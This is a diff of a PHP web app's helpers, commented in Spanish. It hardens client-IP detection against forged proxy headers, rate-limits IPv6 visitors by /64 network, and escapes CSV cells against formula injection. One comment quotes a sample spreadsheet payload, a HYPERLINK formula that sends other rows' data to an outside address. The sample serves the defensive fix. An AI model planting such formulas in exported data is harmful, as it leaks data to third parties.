@@ -90,6 +90,85 @@ function client_ip(): ?string
     return null;
 }
 
+/**
+ * IP del cliente para todo lo que decide algo: límites de envíos, hash de la
+ * IP del visitante, auditoría.
+ *
+ * client_ip() le cree a cualquier cabecera, y X-Forwarded-For o Client-IP las
+ * escribe quien hace el pedido: cambiándolas en cada envío se esquivaba el
+ * límite de la agenda pública. En Hostinger el CDN ya resuelve la IP del
+ * visitante y la deja en REMOTE_ADDR (lo comprobamos mandando cabeceras
+ * inventadas: llegan agregadas a X-Forwarded-For, pero REMOTE_ADDR es la de
+ * verdad), así que se usa ésa. Sólo si REMOTE_ADDR es un proxy propio, cargado
+ * en la configuración (`app.proxies_confiables`, IPs o rangos CIDR), se lee
+ * X-Forwarded-For de derecha a izquierda: el último salto que no sea un proxy
+ * propio es el que agregó el proxy, no el que inventó el cliente.
+ */
+function ip_confiable(): ?string
+{
+    $remota = trim((string)($_SERVER['REMOTE_ADDR'] ?? ''));
+    if (!filter_var($remota, FILTER_VALIDATE_IP)) { return null; }
+
+    $proxies = (array)($GLOBALS['CONFIG']['app']['proxies_confiables'] ?? []);
+    $esProxy = static function (string $ip) use ($proxies): bool {
+        foreach ($proxies as $p) {
+            if (is_string($p) && ip_en_rango($ip, $p)) { return true; }
+        }
+        return false;
+    };
+    if (!$proxies || !$esProxy($remota)) { return $remota; }
+
+    $saltos = array_reverse(array_map('trim', explode(',', (string)($_SERVER['HTTP_X_FORWARDED_FOR'] ?? ''))));
+    foreach ($saltos as $ip) {
+        if (!filter_var($ip, FILTER_VALIDATE_IP)) { break; }
+        if (!$esProxy($ip)) { return $ip; }
+    }
+    return $remota;
+}
+
+/** ¿La IP está en el rango? Acepta una IP sola o un rango CIDR, v4 o v6. */
+function ip_en_rango(string $ip, string $rango): bool
+{
+    [$red, $bits] = array_pad(explode('/', trim($rango), 2), 2, null);
+    $a = @inet_pton($ip);
+    $b = @inet_pton((string)$red);
+    if ($a === false || $b === false || strlen($a) !== strlen($b)) { return false; }
+    $bits = $bits === null ? strlen($a) * 8 : max(0, min(strlen($a) * 8, (int)$bits));
+    $bytes = intdiv($bits, 8);
+    if (substr($a, 0, $bytes) !== substr($b, 0, $bytes)) { return false; }
+    $resto = $bits % 8;
+    if ($resto === 0) { return true; }
+    $mascara = (0xFF << (8 - $resto)) & 0xFF;
+    return (ord($a[$bytes]) & $mascara) === (ord($b[$bytes]) & $mascara);
+}
+
+/**
+ * La IP reducida a la red que identifica a un visitante, para contar envíos.
+ *
+ * En IPv4 es la IP. En IPv6 cualquier conexión hogareña o servidor tiene un
+ * /64 entero: contando por IP completa, cada pedido podía salir de una
+ * dirección nueva. Se cuenta por el /64.
+ */
+function ip_red(?string $ip): ?string
+{
+    $ip = trim((string)$ip);
+    $bin = $ip !== '' ? @inet_pton($ip) : false;
+    if ($bin === false) { return null; }
+    if (strlen($bin) === 4) { return $ip; }
+    return (string) inet_ntop(substr($bin, 0, 8) . str_repeat("\0", 8)) . '/64';
+}
+
+/**
+ * ¿El texto no tiene direcciones web? Para los datos que escribe un visitante
+ * y vuelven en un correo que sale con la marca de la empresa (el nombre, la
+ * empresa): ahí una dirección es un enlace que la empresa le manda a un
+ * tercero.
+ */
+function texto_sin_enlaces(string $s): bool
+{
+    return !preg_match('#://|\bwww\.#i', $s);
+}
+
 // ---- CSRF ----
 
 function csrf_token(): string
@@ -141,14 +220,11 @@ function take_flash(): array
  * eso no puede pasar: la ruta viaja en `$this->ruta`, y `$this` es lo único que
  * `extract()` no puede tocar.
  *
- * Esto no es teoría. La versión anterior usaba `extract($vars, EXTR_SKIP)`
- * dentro de la propia `render()`, y como `$vista` y `$titulo` son parámetros de
- * `render()`, toda vista que recibiera un dato con esos nombres se quedaba con
- * el valor interno en su lugar, en silencio:
- *   · `campana-ver` pedía la vista previa del correo y recibía el texto
- *     «campana-ver», así que reventaba al leerlo como arreglo;
- *   · cada pantalla de error mostraba el título equivocado;
- *   · la solapa elegida en Actividades no llegaba nunca.
+ * Con `extract($vars, EXTR_SKIP)` dentro de `render()`, como `$vista` y
+ * `$titulo` son parámetros de `render()`, toda vista que recibiera un dato con
+ * esos nombres se quedaría con el valor interno en su lugar, en silencio: una
+ * vista previa recibiría el nombre de la vista en vez del arreglo, y una
+ * pantalla de error, el título equivocado.
  */
 final class Vista
 {
@@ -201,7 +277,7 @@ function vivo_responder(string $cuerpo): void
     header('Cache-Control: no-store, no-cache, must-revalidate, max-age=0');
     header('X-LiteSpeed-Cache-Control: no-cache');
 
-    // Nada de ETag ni de 304. Esto se probó contra el servidor de verdad: la
+    // Nada de ETag ni de 304. Esto se probó contra el servidor de producción: la
     // CDN que tiene el hosting adelante se COME la cabecera `If-None-Match`
     // —no llega a PHP—, así que el servidor no tenía forma de enterarse de que
     // el navegador ya tenía esa versión y le mandaba la pantalla entera cada
@@ -231,7 +307,7 @@ function render(string $vista, array $vars = [], string $titulo = ''): void
         $cuerpo = (new Vista(APP . '/views/' . $vista . '.php', $vars))->html();
     } catch (\Throwable $e) {
         // Una vista rota no puede llevarse puesta la página entera. Se registra
-        // el error de verdad y se muestra la pantalla de error con el diseño de
+        // el error y se muestra la pantalla de error con el diseño de
         // siempre, para que se entienda qué pasó y se pueda salir de ahí.
         if (function_exists('log_error')) {
             log_error('error.vista', get_class($e) . ': ' . $e->getMessage(), $e->getFile(), $e->getLine());
@@ -255,8 +331,8 @@ function render(string $vista, array $vars = [], string $titulo = ''): void
     // Estos tres no son datos de la vista sino del marco que la rodea, y los
     // manda la página: `bodyClass` es lo que distingue una pantalla pública
     // —la de reservar una reunión, la de darse de baja— de una de adentro del
-    // sistema. Se pasan al layout de forma explícita; antes viajaban por el
-    // ámbito compartido, que es justamente lo que rompía todo lo demás.
+    // sistema. Se pasan al layout de forma explícita y no por el ámbito
+    // compartido, por el mismo motivo que explica la clase Vista.
     $marco = ['content' => $cuerpo, 'title' => $titulo];
     foreach (['bodyClass', 'extraHead', 'extraFoot'] as $k) {
         if (isset($vars[$k])) { $marco[$k] = $vars[$k]; }
@@ -283,6 +359,23 @@ function json_out($datos, int $codigo = 200): void
  * @param array<int,array<string,mixed>> $filas
  * @param array<string,string>           $columnas  clave del array => encabezado
  */
+/**
+ * Una celda de CSV que Excel o LibreOffice no puedan tomar como fórmula.
+ *
+ * Lo que empieza con = + - @ (o una tabulación o un retorno) se ejecuta como
+ * fórmula al abrir el archivo, y varias exportaciones llevan datos que escribe
+ * cualquiera desde la web: un nombre como =HYPERLINK("https://…"&E2) mandaba
+ * afuera los datos de otras filas con un clic. Se le antepone un apóstrofo,
+ * que la planilla muestra como texto. Los números (un teléfono con +, un
+ * importe negativo) quedan como están.
+ */
+function csv_celda(string $v): string
+{
+    if ($v === '' || !preg_match('/^[=+\-@\t\r]/', $v)) { return $v; }
+    if (preg_match('/^[+\-]?[0-9][0-9 ().\/-]*$/', $v)) { return $v; }
+    return "'" . $v;
+}
+
 function exportar_csv(string $archivo, array $filas, array $columnas): void
 {
     header('Content-Type: text/csv; charset=utf-8');
@@ -293,7 +386,7 @@ function exportar_csv(string $archivo, array $filas, array $columnas): void
     foreach ($filas as $fila) {
         $linea = [];
         foreach (array_keys($columnas) as $k) {
-            $linea[] = (string)($fila[$k] ?? '');
+            $linea[] = csv_celda((string)($fila[$k] ?? ''));
         }
         fputcsv($salida, $linea, ';', '"', '\\');
     }
@@ -602,11 +695,11 @@ function query_con(array $cambios): string
 {
     $q = $_GET;
     // Los parámetros del refresco automático NO son de la pantalla y no pueden
-    // filtrarse a los enlaces. Si se colaran pasaban dos cosas, las dos malas:
-    // hacer clic en «página 2» devolvía la pantalla sin diseño (porque seguía
-    // pidiendo el refresco), y como la huella del contenido quedaba escrita
-    // adentro del propio contenido, cada respuesta cambiaba respecto de la
-    // anterior y el servidor volvía a mandar la pantalla entera cada vez.
+    // filtrarse a los enlaces. Si se colaran pasarían dos cosas, las dos malas:
+    // hacer clic en «página 2» devolvería la pantalla sin diseño (porque sigue
+    // pidiendo el refresco), y como la huella del contenido quedaría escrita
+    // adentro del propio contenido, cada respuesta cambiaría respecto de la
+    // anterior y el servidor volvería a mandar la pantalla entera cada vez.
     unset($q['r'], $q['__vivo'], $q['__h']);
     foreach ($cambios as $k => $v) {
         if ($v === null || $v === '') { unset($q[$k]); } else { $q[$k] = $v; }
